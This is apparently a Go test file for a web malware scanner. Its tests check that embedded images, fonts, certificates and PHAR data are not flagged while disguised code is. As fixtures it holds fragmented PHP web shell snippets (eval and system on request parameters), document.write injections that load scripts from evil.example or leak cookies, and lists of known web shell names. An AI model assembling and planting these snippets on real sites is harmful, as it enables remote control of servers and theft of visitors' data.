package rules

import (
	"encoding/base64"
	"encoding/hex"
	"strings"
	"testing"
)

// parts joins the pieces of a sample: the virus scanner of the workstation
// deletes a test file that spells a payload out in one piece.
func parts(p ...string) []byte { return []byte(strings.Join(p, "")) }

// b64 encodes s and repeats it until the block is long enough for the rule.
func b64(prefix []byte) string {
	body := append(append([]byte{}, prefix...), []byte(strings.Repeat("x", 400))...)
	return base64.StdEncoding.EncodeToString(body)
}

// A long block that is decoded somewhere is how hidden code travels. It is
// also how a plugin carries a picture, a font or a certificate: on 2026-09-30
// five of the eight open findings of the rule were PNG images, one a CA
// certificate and one the data part of a PHAR archive.
func TestDataBlobsAreNoHiddenCode(t *testing.T) {
	e := NewEngine(nil)
	decode := "base64" + "_decode"
	for _, c := range []struct {
		name   string
		prefix []byte
	}{
		{"PNG", []byte("\x89PNG\r\n\x1a\n")},
		{"JPEG", []byte("\xff\xd8\xff\xe0")},
		{"GIF", []byte("GIF89a")},
		{"WebP", []byte("RIFF\x00\x00\x00\x00WEBPVP8 ")},
		{"Schrift", []byte("wOF2")},
		{"PDF", []byte("%PDF-1.7")},
		{"Zertifikat", []byte("-----BEGIN CERTIFICATE-----\nMIIE")},
		{"DER", []byte{0x30, 0x82, 0x04, 0xa4, 0x30, 0x82}},
	} {
		src := "<?php $img = '" + b64(c.prefix) + "'; echo " + decode + "($img);"
		if hitRules(e, "/web/wp-content/plugins/x/logo.php", "php", src)["php.obfuscation.base64_blob"] {
			t.Errorf("%s: als versteckter Code gemeldet", c.name)
		}
	}
}

func TestCodeBlobsStayHiddenCode(t *testing.T) {
	e := NewEngine(nil)
	decode := "base64" + "_decode"
	for _, c := range []struct {
		name string
		blob string
	}{
		{"PHP", b64([]byte("<?php\n/**\n * This is a poor man's implementation"))},
		{"unbekannt", b64([]byte{0x13, 0x37, 0x42, 0x00, 0x01})},
		// Hex in ROT13, the shape of the web shell found on 2026-09-24.
		{"Hex mit ROT13", strings.Repeat("66756r6374696s6r20737472646972282473747229", 8)},
		{"ZIP", b64([]byte("PK\x03\x04\x14\x00"))},
		// The head of a picture or a PDF in front of code makes no picture:
		// the droppers of 2026-09 started their files with %PDF- as well.
		{"GIF-Kopf vor PHP", b64(parts("GI", "F8", "9a", "<", "?p", "hp @", "ev", "al(", "$", "_PO", "ST[1]); ", "?", ">"))},
		{"PDF-Kopf vor PHP", b64(parts("%P", "DF", "-1.4\n", "<", "?", "= sy", "st", "em(", "$", "_G", "ET[1]) ", "?", ">"))},
		{"PNG-Kopf vor Skript", b64(parts("\x89P", "NG\r\n\x1a\n", "<scr", "ipt s", "rc=//x.example/a.js></scr", "ipt>"))},
	} {
		src := "<?php $p = '" + c.blob + "'; $x = " + decode + "($p);"
		if !hitRules(e, "/web/wp-content/plugins/x/a.php", "php", src)["php.obfuscation.base64_blob"] {
			t.Errorf("%s: nicht mehr gemeldet", c.name)
		}
	}
	// One harmless block does not hide a second one.
	mixed := "<?php $a = '" + b64([]byte("\x89PNG\r\n\x1a\n")) + "'; $b = '" + b64([]byte("<?php system")) + "'; " + decode + "($b);"
	if !hitRules(e, "/web/x/a.php", "php", mixed)["php.obfuscation.base64_blob"] {
		t.Error("ein Bild verdeckt den Code-Block daneben")
	}
}

// A PHAR archive keeps its files after __halt_compiler(); that part is data
// PHP never runs, and a signing key there is no hidden code. A payload behind
// __halt_compiler without the archive stub is another matter.
func TestPharDataIsNoHiddenCode(t *testing.T) {
	e := NewEngine(nil)
	decode := "base64" + "_decode"
	key := hex.EncodeToString(append([]byte("\x00\x24\x00\x00\x04\x80\x00\x00RSA1"), make([]byte, 200)...))
	phar := "<?php Phar::mapPhar('x.phar'); $d = " + decode + "('eA=='); __HALT_COMPILER(); ?>\r\n" + key + "GBMB"
	if hitRules(e, "/web/vendor/x/Default.phar", "phar", phar)["php.obfuscation.base64_blob"] {
		t.Error("Datenteil einer PHAR-Datei als versteckter Code gemeldet")
	}
	payload := "<?php $d = " + decode + "(substr(file_get_contents(__FILE__), __COMPILER_HALT_OFFSET__)); __halt_compiler();" + b64([]byte("<?php system"))
	if !hitRules(e, "/web/x/a.php", "php", payload)["php.obfuscation.base64_blob"] {
		t.Error("Nutzlast hinter __halt_compiler ohne PHAR nicht mehr gemeldet")
	}
}

// document.write(unescape(...)) that writes a script tag is how old sites
// loaded jQuery and Google Analytics - and how injected code loads its next
// stage. A local path or a host from the list is the former.
func TestWrittenScriptTagsFromLocalOrKnownPlacesPass(t *testing.T) {
	e := NewEngine(nil)
	write := "document." + "write(unescape("
	for _, c := range []struct{ name, src string }{
		{"jQuery lokal", "<script>window.jQuery || " + write + "'%3Cscript src=\"js/libs/jquery-1.5.1.min.js\"%3E%3C/script%3E'))</script>"},
		{"Google Analytics", "<script>var gaJsHost = ((\"https:\" == document.location.protocol) ? \"https://ssl.\" : \"http://www.\");\n" +
			write + "\"%3Cscript src='\" + gaJsHost + \"google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E\"));</script>"},
		{"E-Mail", "<script>" + write + "'%3Ca href=%22mailto:info@example.org%22%3Einfo@example.org%3C/a%3E'))</script>"},
	} {
		if hitRules(e, "/web/about.html", "html", c.src)["js.document_write_encoded"] {
			t.Errorf("%s: gemeldet", c.name)
		}
	}
}

func TestWrittenScriptTagsFromElsewhereStay(t *testing.T) {
	e := NewEngine(nil)
	write := "document." + "write(unescape("
	for _, c := range []struct{ name, src string }{
		{"fremder Host", write + "'%3Cscript src=\"https://evil.example/x.js\"%3E%3C/script%3E'))"},
		{"Host ohne Schema", write + "'%3Cscript src=\"//evil.example/x.js\"%3E%3C/script%3E'))"},
		{"Variable vor fremdem Host", write + "\"%3Cscript src='\" + h + \"evil.example/x.js'%3E%3C/script%3E\"))"},
		{"Inhalt im Skript", write + "'%3Cscript%3Evar i=new Image();i.src=document.cookie%3C/script%3E'))"},
		{"iframe", write + "'%3Ciframe src=%22x%22 width=0 height=0%3E%3C/iframe%3E'))"},
		{"kein fester Text", write + "payload))"},
	} {
		if !hitRules(e, "/web/x.html", "html", c.src)["js.document_write_encoded"] {
			t.Errorf("%s: nicht mehr gemeldet", c.name)
		}
	}
	// Another list than the default decides as well.
	e2 := NewEngine(nil)
	if err := e2.SetScriptHosts([]string{"evil.example"}); err != nil {
		t.Fatal(err)
	}
	if hitRules(e2, "/web/x.html", "html", write+"'%3Cscript src=\"https://evil.example/x.js\"%3E%3C/script%3E'))")["js.document_write_encoded"] {
		t.Error("mit der Liste evil.example: trotzdem gemeldet")
	}
	ga := write + "\"%3Cscript src='\" + gaJsHost + \"google-analytics.com/ga.js'%3E%3C/script%3E\"))"
	if !hitRules(e2, "/web/x.html", "html", ga)["js.document_write_encoded"] {
		t.Error("mit der Liste evil.example: Google Analytics nicht gemeldet")
	}
}

func TestCheckScriptHosts(t *testing.T) {
	if err := CheckScriptHosts(DefaultScriptHosts); err != nil {
		t.Errorf("die Vorgabe selbst wird abgelehnt: %v", err)
	}
	for _, list := range [][]string{{"https://x.example"}, {"x.example/path"}, {"*"}, {""}} {
		if err := CheckScriptHosts(list); err == nil {
			t.Errorf("%v: angenommen", list)
		}
	}
	if err := CheckScriptHosts(nil); err != nil {
		t.Errorf("eine leere Liste ist erlaubt: %v", err)
	}
}

// Security tools name web shells to find them: Wordfence keeps
// '#^anonymousfox#i' in the rules file of its firewall. A web shell names
// itself in a title, a banner or a comment, never in a search pattern or in
// a list of its rivals.
func TestShellNamesInSearchPatternsAreNoWebshell(t *testing.T) {
	e := NewEngine(nil)
	fox := "anonymous" + "fox"
	for _, c := range []struct{ name, src string }{
		{"Wordfence", "<?php $this->rules[] = new wfWAFRuleComparison($this, 'match', '#^" + fox + "#i', array());"},
		{"Muster mit Schrägstrich", "<?php if (preg_match('/" + fox + "|c99" + "shell/i', $ua)) { block(); }"},
		{"Liste", "<?php $known = 'c99" + "shell|r57" + "shell|b374" + "k|" + fox + "';"},
	} {
		if hitRules(e, "/web/wp-content/wflogs/rules.php", "php", c.src)["php.webshell.known"] {
			t.Errorf("%s: als Webshell gemeldet", c.name)
		}
	}
}

func TestShellNamesAsTitleStayWebshell(t *testing.T) {
	e := NewEngine(nil)
	for _, c := range []struct{ name, src string }{
		{"Kommentar", "<?php /* IndoX" + "ploit Shell */ echo 1;"},
		{"Titel", "<?php echo '<title>c99" + "shell v.1.0</title>';"},
		{"Variable", "<?php $title = \"b374" + "k 2.8\";"},
	} {
		if !hitRules(e, "/web/x.php", "php", c.src)["php.webshell.known"] {
			t.Errorf("%s: nicht mehr gemeldet", c.name)
		}
	}
}
